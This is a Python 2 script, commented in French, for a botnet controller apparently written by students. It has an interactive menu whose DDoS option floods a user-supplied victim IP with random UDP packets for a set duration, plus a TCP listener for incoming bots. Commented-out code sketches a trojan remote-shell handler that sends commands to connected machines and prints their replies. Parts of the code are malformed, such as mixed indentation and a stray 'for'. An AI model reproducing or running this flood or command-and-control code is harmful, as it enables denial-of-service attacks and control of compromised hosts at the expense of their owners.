#!/usr/bin/env python
# coding: utf-8

#Importation des modules 
import socket
import threading
import sys, os
import time
import random

#Ip du serveur
bind_ip = "0.0.0.0" 
bind_port = 8080    

# Definition du menu
menu_actions  = {}  
 
# =======================
#     Fonctions Menu
# =======================
 
# Main menu
def main_menu():
    	os.system('clear')
	print"*********************************************************"
	print"*********************************************************"
	print"**  _            ______                                **"
	print"** | |           |  ___|                         _     **"
	print"** | |     __ _  | |_ ___  _ __ _ __ ___   ___  (_)    **"
	print"** | |    / _` | |  _/ _ \| '__| '_ ` _ \ / _ \        **"
	print"** | |___| (_| | | || (_) | |  | | | | | |  __/  _     **"
	print"** \_____/\__,_| \_| \___/|_|  |_| |_| |_|\___| (_)    **"
	print"**                                                     **"
	print"** _____ _   _  _____  ______       _   _   _      _   **"
	print"**|_   _| | | ||  ___| | ___ \     | | | \ | |    | |  **"
	print"**  | | | |_| || |__   | |_/ / ___ | |_|  \| | ___| |_ **"
	print"**  | | |  _  ||  __|  | ___ \/ _ \| __| . ` |/ _ \ __|**"
	print"**  | | | | | || |___  | |_/ / (_) | |_| |\  |  __/ |_ **"
	print"**  \_/ \_| |_/\____/  \____/ \___/ \__\_| \_/\___|\__|**"
	print"*********************************************************"
	print"*********************************************************"
	print"****BotNet La Forme Developpe  par: Guillaume Soares,****"
	print"***********Nathan  Fievez et Alexandre Villain***********"
	print"*********************************************************"
	print ""
	print "Quel est votre choix ?"
	print ""
	print "Appuyez sur 1 pour Afficher le Menu DDOS"
	print "Appuyez sur 2 pour Afficher le Menu Bot"
	print " "
	print "\n0. Quit"
	choice = raw_input(" >>  ")
	exec_menu(choice)
 
	return
 
# Execution du menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Selection invalide, veuillez reesseyer\n"
            menu_actions['main_menu']()
    return
 
# Menu DDOS
def menu1():
    	print "Bienvenue sur le menu DDOS \n"
    	target = raw_input("Ip de la victime :  ")
	print("===")
	package = input("Taille paquet (MAX 65500): ")
	print("===")
	duration = input("Duree en seconde (0 = illimite): ")
	durclock = (lambda:0, time.clock)[duration > 0]
	duration = (1, (durclock() + duration))[duration > 0]
	packet = random._urandom(package)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	print("===")
	print("The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
	while True:
		if (durclock() < duration):
		        port = random.randint(1, 65535)
		        sock.sendto(packet, (target, port))
		else:
		        break
	print("===")
	print("The UDP flood has completed on %s for %s seconds." % (target, duration))
	print("===")
	print "9. Retour"
    	print "0. Quit"	
	choice = raw_input(" >>  ")
   	exec_menu(choice)
    	return 


# Menu Bots
class ClientThread(threading.Thread):

    def __init__(self, ip, port, clientsocket):

        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.clientsocket = clientsocket
        print("[+] Nouveau thread pour %s %s" % (self.ip, self.port, ))

    def run(self): 
   
        print("Connexion de %s %s" % (self.ip, self.port, ))

        print("Client deconnecte...")

tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcpsock.bind(("",80))

def connexion():
	while True:
	    tcpsock.listen(10)
	    print( "En ecoute...")
	    (clientsocket, (ip, port)) = tcpsock.accept()
	    newthread = ClientThread(ip, port, clientsocket)
	    newthread.start()






'''
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5) 
clients = []
address = []

def handle_client(client_socket):
		print "Bienvenue sur le menu Bots\n"
		print "Nombre de Bots connectes et ouverture d'un SHELL "
		print("===")
		print "[*] En attente client - Ecoute sur %s:%d" %(bind_ip,bind_port)
		#send back the packet 
    		response = raw_input("Shell >> ")
    		client_socket.sendall(response)
		#print the client data
    		request = client_socket.recv(2048)
    		print "[*] Received: %s\n" % request
def connexion():
	while True:
		client,addr = server.accept()
			for 
		print "[*] Connexion acceptee sur %s:%d" % (addr[0],addr[1])
		#threading started
		client_handler = threading.Thread(target=handle_client,args=(client,))
		client_handler.start()
'''		
		
# Retour au menu principal
def back():
    menu_actions['main_menu']()
 
# Quitter le programme
def exit():
    sys.exit()

# =======================
#    Definition menu
# =======================
 
# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': connexion,
    '9': back,
    '0': exit,
}
 
# =======================
#   Programme principal
# =======================
 
# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()



'''


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5)  

# 
print "[*] Trojan ok - listening on %s:%d" %(bind_ip,bind_port)
	
def handle_client(client_socket):
	while True:
		# go to the choice list
		print "[*] What would you like to do ?\n"
		print "[*] go 1 for a shell"
		print "[*] go 2 for ..."
		print "[*] go 2 for ..."
		choiseTrojan = raw_input("[waiting for your choice] 1 - 2 - 3 -> ")
		if choiseTrojan == "1":
			#send back the packet 
			response = raw_input("which command would you like ?\n")
			client_socket.sendall(response)
			#print the client data
			request = client_socket.recv(2048)
			print "[*] Received: %s\n" % request

#loop for waiting connections
while True: 
	client,addr = server.accept()
	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])
#threading started
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()
'''
